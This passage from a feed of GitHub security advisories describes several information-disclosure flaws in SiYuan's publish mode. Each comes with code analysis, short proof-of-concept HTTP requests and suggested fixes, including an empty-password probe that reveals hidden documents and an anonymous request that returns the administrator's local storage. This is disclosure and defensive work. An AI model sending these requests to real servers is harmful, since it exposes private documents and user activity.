-<p><strong>Handler,</strong> <code>kernel/api/filetree.go:1608</code> on the development branch and <code>:1421</code> on master. <code>ret.Code</code> is never assigned on the failure path, so every response carries <code>code:0</code>. The branch is:</p>
-<pre><code class="language-go">if item.Password == password {
-    // SetPublishAuthCookie
-} else {
-    ret.Msg = Conf.Language(285)
-}
-</code></pre>
-<p><strong>The cookie is issued for forbidden documents.</strong> Entries at the hidden and forbidden tiers store <code>Password == ""</code>. A request with <code>password:""</code> therefore makes <code>item.Password == password</code> true for them, and the handler takes the success branch. The server issues a publish-auth cookie for a document it otherwise treats as inaccessible.</p>
-<p>The cookie itself confers nothing, because those tiers are decided before any password check elsewhere in the codebase. The defect is that the endpoint's success signal does not correspond to access being granted, and that signal is observable.</p>
-<p><strong>Three distinguishable outcomes.</strong> With <code>password:""</code>, one request per candidate identifier:</p>
-<table>
-<thead>
-<tr>
-<th>Tier of the target</th>
-<th><code>Set-Cookie</code></th>
-<th>Body</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Public (no publish-access entry)</td>
-<td>absent</td>
-<td><code>{"code":0,"msg":""}</code></td>
-</tr>
-<tr>
-<td>Nonexistent identifier</td>
-<td>absent</td>
-<td><code>{"code":0,"msg":""}</code></td>
-</tr>
-<tr>
-<td>Password-protected</td>
-<td>absent</td>
-<td><code>{"code":0,"msg":"Password is incorrect"}</code></td>
-</tr>
-<tr>
-<td>Hidden</td>
-<td><strong>present</strong></td>
-<td><code>{"code":0,"msg":""}</code></td>
-</tr>
-<tr>
-<td>Forbidden</td>
-<td><strong>present</strong></td>
-<td><code>{"code":0,"msg":""}</code></td>
-</tr>
-</tbody></table>
-<p>Public and nonexistent are indistinguishable from each other, which is correct. Everything else separates. A caller learns whether a given identifier names a password-protected document, or a document that exists at the hidden or forbidden tier, which is precisely the class the publish tiers exist to conceal.</p>
-<p><strong>Identifiers are readily available.</strong> Document and block identifiers appear in the DOM of published pages, in reference and backlink payloads, and in annotation reference data. The caller does not need to guess them.</p>
-<p><strong>A fourth response on the development branch.</strong> <code>IsEncryptedPublishRuntimeTarget</code> sets <code>ret.Code = -1</code>, which identifies the supplied identifier as belonging to an encrypted notebook. That is a membership oracle for encrypted notebooks, the same data class as <code>GHSA-f2rw-w22v-54vh</code>.</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<p>Publish mode enabled, <code>Publish.Auth.Enable</code> false, anonymous client. One request per candidate identifier, all with an empty password:</p>
-<pre><code>POST /api/filetree/authFilePublishAccess
-{"id":"&lt;candidate document id&gt;","password":""}
-</code></pre>
-<p>Comparing the response message and the presence of <code>Set-Cookie</code> against the table above classifies the identifier. Documents at the hidden and forbidden tiers return a publish-auth cookie and an empty message, distinguishing them both from public documents and from identifiers that name nothing at all.</p>
-<h3 id="impact">Impact</h3>
-<p>An anonymous reader in publish mode, or any publish <code>RoleReader</code>, can classify arbitrary document identifiers by access tier and confirm the existence of documents at the hidden and forbidden tiers. On the development branch the same endpoint additionally reveals whether an identifier belongs to an encrypted notebook.</p>
-<p>Scoped precisely: no document content is disclosed and no privilege is gained, since the issued cookie is inert for these tiers. The value is as a confirmation primitive, turning an identifier obtained elsewhere into a definite statement about a document the reader is not permitted to see.</p>
-<p>Confidentiality only, with no integrity or availability impact.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Return an identical response for every failure and for every tier the caller may not access, with no <code>Set-Cookie</code> header and no distinguishing message. In particular, do not treat an empty stored password as a successful match: hidden and forbidden entries should short-circuit before the password comparison rather than satisfying it. The encrypted-notebook branch should return the same generic response as everything else rather than its own code.</p>
-<p>A rate limit on this endpoint would be a reasonable additional hardening measure, though it does not address the disclosure above.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjg-x8qj-33j5">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjg-x8qj-33j5</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73630">https://nvd.nist.gov/vuln/detail/CVE-2026-73630</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/commit/c7522b8db586ef1e1d6fa98bbe7ca0eb9d019efe">https://github.com/siyuan-note/siyuan/commit/c7522b8db586ef1e1d6fa98bbe7ca0eb9d019efe</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-authfilepublishaccess">https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-authfilepublishaccess</a></li>
-<li><a href="https://github.com/advisories/GHSA-4pjg-x8qj-33j5">https://github.com/advisories/GHSA-4pjg-x8qj-33j5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4pjg-x8qj-33j5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-23T18:31:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] Duplicate Advisory: authFilePublishAccess distinguishes hidden and forbidden documents from public and nonexistent ones, and issues a publish-auth cookie for documents it reports as forbidden]]></title>
-        <id>https://github.com/advisories/GHSA-vg9q-fc8f-43f3</id>
-        <link href="https://github.com/advisories/GHSA-vg9q-fc8f-43f3"/>
-        <updated>2026-10-23T18:31:18.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-4pjg-x8qj-33j5. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SiYuan before v3.7.4 contains an information disclosure vulnerability in the /api/filetree/authFilePublishAccess endpoint, which is registered with CheckAuth only and is reachable anonymously. The endpoint never sets a failure code, so its outcome is signalled entirely by the response message and by the presence of a Set-Cookie header, and these signals differ across access tiers. By submitting requests with an empty password for a candidate document identifier, an anonymous attacker can distinguish whether a document is public/nonexistent, password-protected, or exists at the hidden or forbidden tier, thereby confirming the existence of documents they are not permitted to access. Because hidden and forbidden entries store an empty password, such requests also cause the server to issue a publish-auth cookie for forbidden documents.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjg-x8qj-33j5">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-4pjg-x8qj-33j5</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73630">https://nvd.nist.gov/vuln/detail/CVE-2026-73630</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-authfilepublishaccess">https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-authfilepublishaccess</a></li>
-<li><a href="https://github.com/advisories/GHSA-vg9q-fc8f-43f3">https://github.com/advisories/GHSA-vg9q-fc8f-43f3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vg9q-fc8f-43f3</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-14T12:31:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: The publish filter for database backlinks consults the forbidden list instead of the visibility list, disclosing hidden-tier documents to anonymous readers]]></title>
-        <id>https://github.com/advisories/GHSA-p4qw-vx5p-g984</id>
-        <link href="https://github.com/advisories/GHSA-p4qw-vx5p-g984"/>
-        <updated>2026-10-23T18:30:45.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>/api/av/getAttributeViewBacklinks</code> filters its results for reader roles through <code>FilterAttributeViewBacklinksByPublishAccess</code>. That function resolves its ignore list with <code>GetDisablePublishAccess</code>, which covers only the forbidden tier. Documents at the hidden tier are absent from that list, so they pass the check.</p>
-<p>The result is that an anonymous reader supplying a publicly visible database row receives the database name, row title and document path of rows in hidden documents that reference it.</p>
-<p>The rest of the function is correct. It takes <code>*gin.Context</code> and calls <code>GetPathPasswordByPublishAccess</code> and <code>CheckPublishAuthCookie</code> at all four decision points, so the password-protected and private tiers are properly enforced. The defect is the choice of list, on one line.</p>
-<h3 id="details">Details</h3>
-<p><strong>Route,</strong> <code>kernel/api/router.go:545</code> on the development branch and <code>:527</code> on master:</p>
-<pre><code class="language-go">ginServer.Handle("POST", "/api/av/getAttributeViewBacklinks", model.CheckAuth, getAttributeViewBacklinks)
-</code></pre>
-<p><code>CheckAuth</code> only. No <code>CheckAdminRole</code>, no <code>CheckReadonly</code>.</p>
-<p><strong>The defect.</strong> In <code>FilterAttributeViewBacklinksByPublishAccess</code> (<code>kernel/model/publish_access.go:1060</code> on dev, <code>:435</code> on master):</p>
-<pre><code class="language-go">publishIgnore := GetDisablePublishAccess(publishAccess)
-</code></pre>
-<p><code>GetDisablePublishAccess</code> returns only entries at the forbidden tier. A hidden document has <code>visible:false</code>, <code>password:""</code>, <code>disable:false</code>, so it does not appear in that list. <code>CheckPathAccessableByPublishIgnore</code> therefore returns true for it, and because the password is empty the authentication branch short-circuits. Hidden documents pass both halves of the check.</p>
-<p><strong>The sibling filter uses the correct list.</strong> The regular backlink panel is the same product feature in the same UI, and it is gated properly. <code>kernel/api/ref.go:170</code> <code>getBacklink2</code> calls <code>FilterPathsByPublishAccess</code>, which at <code>kernel/model/publish_access.go:1256</code> resolves its list with <code>GetInvisiblePublishAccess</code>. Two backlink filters in the same file, opposite list choices.</p>
-<p><strong>The distinction the tiers are meant to draw.</strong> The shipped description of the hidden tier, from <code>app/appearance/langs/en.json</code>:</p>
-<pre><code>publishAccessHiddenComment = "Not publicly visible, can be accessed directly."
-</code></pre>
-<p>A direct-access endpoint using the forbidden list is consistent with that: hidden documents are meant to be reachable when the caller already knows the identifier. Backlink discovery is not direct access. The caller supplies the target row and receives the identities of referring rows it never named, which is enumeration, and enumeration is precisely what "not publicly visible" excludes.</p>
-<p><strong>Origin.</strong> The filter was introduced by <code>6da2c736e</code> (2026-07-18, "Show database relation backlinks in the attribute panel", #10599) with this list choice from the start. No security-focused commit has touched the attribute-view backlink path since.</p>
-<p><strong>What is returned.</strong> Per matched backlink: <code>AvName</code> (the database name), <code>Title</code> (the row title), <code>DatabasePath</code> (the HPath of the containing document), <code>BoxID</code>, <code>DatabaseBlockID</code>, and <code>Relations[].KeyName</code>. These are author-written names and titles, not opaque identifiers.</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<p>Publish mode enabled, <code>Publish.Auth.Enable</code> false, anonymous client with no credentials or cookies. Document A is public and holds a database with a row. Document B is set to varying tiers and holds a database whose relation field points at A's row. The attacker needs only A's <code>avID</code> and <code>itemID</code>, both present in the DOM of A's own published page.</p>
-<p>Listing control first, establishing that the platform agrees B must not be listed:</p>
-<pre><code>POST /api/filetree/listDocsByPath
-→ returns only the public document
-</code></pre>
-<p>Then the same backlinks request at four tier settings, spaced to clear the 30-second <code>GetPublishAccess()</code> cache:</p>
-<table>
-<thead>
-<tr>
-<th>Tier of document B</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Hidden (<code>visible:false</code>, no password, <code>disable:false</code>)</td>
-<td><code>total:1</code>, with <code>avName</code>, <code>title</code>, <code>databasePath</code> and <code>relations[].keyName</code> for the row in B</td>
-</tr>
-<tr>
-<td>Forbidden (<code>disable:true</code>)</td>
-<td><code>total:0</code></td>
-</tr>
-<tr>
-<td>Private (password set)</td>
-<td><code>total:0</code></td>
-</tr>
-<tr>
-<td>Hidden again (restored)</td>
-<td><code>total:1</code>, reproducible</td>
-</tr>
-</tbody></table>
-<p>The forbidden row confirms that the disable list is what the filter consults. The private row confirms that the password half works correctly. The gap is the hidden tier alone.</p>
-<pre><code>POST /api/av/getAttributeViewBacklinks
-{"avID":"&lt;public database id&gt;","itemID":"&lt;public row id&gt;"}
-
-→ 200, total:1, disclosing the database name, row title and document path
-       of a document the same session cannot list
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>An anonymous reader in publish mode, or any publish <code>RoleReader</code>, discovers that a hidden document contains a database row referencing a public one, and receives that row's title, its database's name, and the containing document's path. Names and titles are author-written and routinely describe their subject, so this discloses both the existence and the topic of documents the author marked as not publicly visible.</p>
-<p>The reader does not need to know anything about the hidden document beforehand. The only input is a public row identifier taken from a page they are already entitled to view.</p>
-<p>Confidentiality only, with no integrity or availability impact. No document body content is returned.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Change the list resolution in <code>FilterAttributeViewBacklinksByPublishAccess</code> to <code>GetInvisiblePublishAccess</code>, mirroring <code>FilterPathsByPublishAccess</code> on the regular backlink path. The password handling in the function is already correct and needs no change.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4qw-vx5p-g984">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4qw-vx5p-g984</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73049">https://nvd.nist.gov/vuln/detail/CVE-2026-73049</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/commit/5b42614311b0afda29ccc65e55d74bf3e8cc9054">https://github.com/siyuan-note/siyuan/commit/5b42614311b0afda29ccc65e55d74bf3e8cc9054</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.4</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-getattributeviewbacklinks">https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-getattributeviewbacklinks</a></li>
-<li><a href="https://github.com/advisories/GHSA-p4qw-vx5p-g984">https://github.com/advisories/GHSA-p4qw-vx5p-g984</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p4qw-vx5p-g984</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-23T18:30:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] Duplicate Advisory: SiYuan: The publish filter for database backlinks consults the forbidden list instead of the visibility list, disclosing hidden-tier documents to anonymous readers]]></title>
-        <id>https://github.com/advisories/GHSA-6xvp-3rfv-g2g2</id>
-        <link href="https://github.com/advisories/GHSA-6xvp-3rfv-g2g2"/>
-        <updated>2026-10-23T18:30:27.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-p4qw-vx5p-g984. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SiYuan versions before v3.7.4 contain an information disclosure vulnerability in the getAttributeViewBacklinks endpoint that consults the forbidden access list instead of the visibility list when filtering backlinks. Anonymous readers can supply a publicly visible database row identifier to discover hidden-tier documents that reference it, receiving the database name, row title, and document path of hidden documents.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4qw-vx5p-g984">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-p4qw-vx5p-g984</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73049">https://nvd.nist.gov/vuln/detail/CVE-2026-73049</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-getattributeviewbacklinks">https://www.vulncheck.com/advisories/siyuan-before-information-disclosure-via-getattributeviewbacklinks</a></li>
-<li><a href="https://github.com/advisories/GHSA-6xvp-3rfv-g2g2">https://github.com/advisories/GHSA-6xvp-3rfv-g2g2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6xvp-3rfv-g2g2</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-14T12:31:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: The publish filter for local storage returns the administrator's entire storage map with only three keys sanitized]]></title>
-        <id>https://github.com/advisories/GHSA-xp3q-r38w-vgqm</id>
-        <link href="https://github.com/advisories/GHSA-xp3q-r38w-vgqm"/>
-        <updated>2026-10-23T18:29:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="relationship-to-ghsa-hgfg-j9pg-43xw">Relationship to GHSA-hgfg-j9pg-43xw</h3>
-<p>That advisory concerned the administrator's live UI layout, and commit <code>63c7d5474</code> resolved it by removing <code>FilterUILayoutByPublishIgnore</code> and nulling <code>Conf.UILayout</code> for readers. That fix is correct and complete for the live layout.</p>
-<p>This report concerns a different endpoint, a different filter function and a different storage backing. <code>/api/storage/getLocalStorage</code> reads <code>data/storage/local.json</code> rather than <code>Conf.UILayout</code>, and its filter <code>FilterLocalStorageByPublishAccess</code> was not touched by that commit. The consequence is that the same serialized tab objects the earlier fix withheld continue to be served, from the closed-tab history rather than the live layout.</p>
-<h3 id="summary">Summary</h3>
-<p>Three routes, <code>/api/storage/getLocalStorage</code>, <code>getLocalStorageVal</code> and <code>getLocalStorageVals</code>, are registered with <code>CheckAuth</code> only and are reachable by the publish <code>RoleReader</code> token and anonymously when <code>Publish.Auth.Enable</code> is <code>false</code>. All three call <code>model.GetLocalStorage()</code> and then, for read-only roles, <code>FilterLocalStorageByPublishAccess</code>.</p>
-<p>That filter begins by assigning the administrator's entire storage map to its return value and then removes three specific fields. Everything else in the map is returned unmodified. A single unauthenticated POST with an empty body returns the administrator's recently closed tabs with their document titles and identifiers, their current search keywords and the paths those searches cover, the expanded private paths in their file tree, and per-document identifiers from several other keys.</p>
-<h3 id="details">Details</h3>
-<p><strong>Routes.</strong> <code>kernel/api/router.go:87-89</code> on master, the same block on the development branch:</p>
-<pre><code class="language-go">ginServer.Handle("POST", "/api/storage/getLocalStorage",     model.CheckAuth, getLocalStorage)
-ginServer.Handle("POST", "/api/storage/getLocalStorageVal",  model.CheckAuth, getLocalStorageVal)
-ginServer.Handle("POST", "/api/storage/getLocalStorageVals", model.CheckAuth, getLocalStorageVals)
-</code></pre>
-<p>No <code>CheckAdminRole</code>, no <code>CheckReadonly</code>.</p>
-<p><strong>The filter is an allowlist inverted into a blocklist.</strong> <code>kernel/model/publish_access.go:911</code> on master and <code>:1481</code> on the development branch, byte-identical on both:</p>
-<pre><code class="language-go">func FilterLocalStorageByPublishAccess(publishAccess PublishAccess, localStorage map[string]any) (ret map[string]any) {
-    ret = localStorage            // the entire administrator map
-    publishIgnore := GetInvisiblePublishAccess(publishAccess)
-    // clears local-searchkeys["keys"]
-    // clears local-searchasset["k"] and ["keys"]
-    // blanks local-docinfo["id"], only when bt != nil, visible tier only, no password check
-    return
-}
-</code></pre>
-<p><code>local.json</code> holds roughly thirty keys. Three are sanitized. The rest are returned as stored.</p>
-<p><strong>What survives.</strong> Taking the client's own list of keys it round-trips through this endpoint (<code>app/src/protyle/util/compatibility.ts:563</code>), the notable survivors are:</p>
-<ul>
-<li><code>local-closed-tabs</code>. Up to <code>SIZE_UNDO</code> entries, each produced by <code>layoutToJSON(item, tabJSON)</code> at <code>app/src/layout/Wnd.ts:779</code>. This is the same serializer that produced the data in the earlier advisory: tab title, <code>docIcon</code>, <code>rootId</code>, <code>notebookId</code>, <code>blockId</code>, <code>mode</code>, <code>action</code>, and for a Search tab the entire config object. Unfiltered.</li>
-<li><code>local-searchdata</code>. The live document-search configuration, including <code>k</code> (the search text), <code>r</code> (replace text), <code>hPath</code>, <code>idPath</code> (the paths the search was scoped to) and <code>types</code>. Note the filter clears the search <em>history</em> array and the <em>asset</em>-search keyword, but leaves the document-search keyword itself. The project's own standard is applied to two of the three related fields.</li>
-<li><code>local-filespaths</code>. <code>IFilesPath[]</code> of <code>{notebookId, openPaths[]}</code>, the expanded private notebook and folder paths in the file-tree dock.</li>
-<li><code>local-fileposition</code>, <code>local-outline</code>, <code>local-zoom</code>. Keyed by document or block identifier, so each discloses private document identifiers.</li>
-<li><code>local-move-path</code>. <code>{keys[], k}</code>, the move-document dialog's path history and last keyword.</li>
-<li><code>local-recent-docs</code>, <code>local-history</code>, <code>local-flashcard</code>, <code>local-dailynoteid</code>, <code>local-layouts</code>.</li>
-</ul>
-<p><strong>The asymmetry is visible in the function signature.</strong> In the same file, <code>kernel/api/storage.go</code>:</p>
-<table>
-<thead>
-<tr>
-<th>Handler</th>
-<th>Filter</th>
-<th>Receives <code>*gin.Context</code></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>getCriteria</code></td>
-<td><code>FilterCriteriaByPublishAccess(c, ...)</code></td>
-<td>yes</td>
-</tr>
-<tr>
-<td><code>getRecentDocs</code></td>
-<td><code>FilterRecentDocsByPublishAccess(c, ...)</code></td>
-<td>yes</td>
-</tr>
-<tr>
-<td><code>getLocalStorage</code> / <code>Val</code> / <code>Vals</code></td>
-<td><code>FilterLocalStorageByPublishAccess(publishAccess, data)</code></td>
-<td>no</td>
-</tr>
-</tbody></table>
-<p>The two sibling filters take the request context and can therefore call <code>CheckPublishAuthCookie</code> to evaluate the password tier. <code>FilterLocalStorageByPublishAccess</code> does not receive the context, so it cannot perform that check at all. The visible-only limitation is fixed in the parameter list rather than in the body.</p>
-<p>Separately, <code>local-recent-docs</code> passes through this endpoint unfiltered, which bypasses the dedicated <code>FilterRecentDocsByPublishAccess</code> that guards the same data on <code>getRecentDocs</code>.</p>
-<p><strong>Note on a prior assessment.</strong> <code>getLocalStorage</code> appears on lists of endpoints considered correctly filtered, on the basis that it calls a <code>Filter*ByPublishAccess</code> function. That observation is accurate and this report does not contradict it. The filter is called. What it does is assign the whole map and remove three fields.</p>
-<p><strong>No persistence side effect.</strong> The in-place mutations the filter performs do not corrupt the administrator's stored state, because <code>GetLocalStorage</code> re-reads and unmarshals <code>storage/local.json</code> on each call (<code>kernel/model/storage.go:82</code>), so the map is per-request. This is noted to pre-empt the concern rather than as part of the finding.</p>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<p>Precondition: publish mode enabled (default port 6808), anonymous when <code>Publish.Auth.Enable</code> is <code>false</code>, otherwise any publish reader account. An administrator who has used the client normally, closing some document tabs and running a search.</p>
-<pre><code>POST http://127.0.0.1:6808/api/storage/getLocalStorage
-{}
-
-→ 200. The returned map includes, among others:
-     local-closed-tabs   entries carrying title, docIcon, rootId, notebookId,
-                         blockId for recently closed documents, including
-                         documents the reader has no publish access to
-     local-searchdata    k, r, hPath, idPath for the administrator's current
-                         document search
-     local-filespaths    notebookId and openPaths for expanded private folders
-     local-fileposition  keys are private document identifiers
-</code></pre>
-<p><code>getLocalStorageVal</code> returns any single key by name, so a caller who only wants the closed-tab history can request it directly.</p>
-<p>For contrast, requesting the same underlying data through the sibling endpoint shows the filtering that is applied elsewhere:</p>
-<pre><code>POST http://127.0.0.1:6808/api/storage/getRecentDocs
-{}
-
-→ 200, filtered by FilterRecentDocsByPublishAccess
-</code></pre>
-<p>while <code>local-recent-docs</code> inside the storage response is not.</p>
-<h3 id="impact">Impact</h3>
-<p>An anonymous reader in publish mode, or any publish <code>RoleReader</code>, obtains the administrator's working context: the titles and identifiers of documents they recently had open, what they have been searching for and where, which private folders they have expanded, and per-document identifiers across several other keys. Titles and search keywords are author-written text and routinely describe the subject of the documents they refer to.</p>
-<p>The document and notebook identifiers disclosed here are also the input required by identifier-to-path and path-to-content resolution, so the value is not limited to the metadata itself.</p>
-<p>No document bodies are returned, and nothing is written. Confidentiality only.</p>
-<h3 id="suggested-fix">Suggested fix</h3>
-<p>Invert the filter into an actual allowlist. Return only the keys a publish reader needs to render published content, which is a short list along the lines of <code>local-images</code>, <code>local-emojis</code>, <code>local-pdftheme</code>, <code>local-fontstyles</code> and the theme and zoom preferences, and drop everything else by default. New keys added in future then default to withheld rather than exposed.</p>
-<p>Additionally, pass <code>*gin.Context</code> into <code>FilterLocalStorageByPublishAccess</code> so that any retained per-document entry can be gated with the full <code>CheckBlockIdAccessableByPublishAccess</code> including the password tier, matching the sibling filters in the same file.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xp3q-r38w-vgqm">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-xp3q-r38w-vgqm</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/commit/4daee87d41521d119979f2edda67e87f2be7b6ef">https://github.com/siyuan-note/siyuan/commit/4daee87d41521d119979f2edda67e87f2be7b6ef</a></li>
-<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.3">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.4-alpha.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-xp3q-r38w-vgqm">https://github.com/advisories/GHSA-xp3q-r38w-vgqm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xp3q-r38w-vgqm</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-23T18:29:45.000Z</published>
     </entry>
 </feed>
